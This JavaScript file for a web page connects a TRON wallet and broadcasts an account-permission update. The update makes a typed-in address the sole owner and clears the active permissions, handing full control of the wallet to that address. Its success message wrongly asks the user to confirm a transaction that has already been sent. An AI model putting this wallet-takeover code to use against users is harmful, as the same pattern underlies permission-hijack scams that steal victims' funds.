document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('updatePermissionButton');
    button.addEventListener('click', async () => {
        const newOwnerAddress = document.getElementById('newOwnerAddress').value;
        if (!newOwnerAddress) {
            alert("请填写新所有者地址");
            return;
        }
        try {
            await connectWallet();
            await updatePermission(newOwnerAddress);
        } catch (error) {
            console.error("操作时出错:", error);
            alert("操作失败，请检查控制台日志了解详情");
        }
    });
});

async function connectWallet() {
    const tronWeb = window.tronWeb;

    if (tronWeb && tronWeb.defaultAddress.base58) {
        console.log("钱包已连接:", tronWeb.defaultAddress.base58);
        return;
    }

    if (tronWeb && tronWeb.request) {
        await tronWeb.request({ method: 'tron_requestAccounts' });
    } else if (tronWeb && tronWeb.trx && tronWeb.trx.getCurrentAccount) {
        await tronWeb.trx.getCurrentAccount();
    } else if (window.imToken && imToken.callAPI) {
        await imToken.callAPI('tron_requestAccounts');
    } else if (window.tokenpocket && tokenpocket.tronLink) {
        await tokenpocket.tronLink.request({ method: 'tron_requestAccounts' });
    } else {
        throw new Error("连接钱包失败，请使用支持的TRON钱包。");
    }

    if (!tronWeb || !tronWeb.defaultAddress.base58) {
        throw new Error("连接钱包失败。");
    }
}

async function updatePermission(newOwnerAddress) {
    const tronWeb = window.tronWeb;
    const currentAddress = tronWeb.defaultAddress.base58;

    if (!currentAddress) {
        console.error("未找到钱包地址，请连接您的钱包。");
        return;
    }

    console.log("当前地址:", currentAddress);
    console.log("新所有者地址:", newOwnerAddress);

    try {
        const ownerPermission = {
            type: 0,
            permission_name: 'owner',
            threshold: 1,
            keys: [{ address: tronWeb.address.toHex(newOwnerAddress), weight: 1 }]
        };

        const activePermissions = [];

        const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
            currentAddress,
            ownerPermission,
            null,
            activePermissions
        );

        console.log("交易:", transaction);

        const signedTransaction = await tronWeb.trx.sign(transaction);
        console.log("签名的交易:", signedTransaction);

        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log("交易结果:", result);

        if (result.result) {
            console.log("交易发送成功，请检查您的钱包以签署交易。");
            alert("交易发送成功，请在钱包中确认交易。");
        } else {
            console.error("交易失败:", result.message);
            alert("交易失败，请检查控制台日志了解详情");
        }
    } catch (error) {
        console.error("发送交易时出错:", error);
        alert("发送交易时出错，请检查控制台日志了解详情");
    }
}
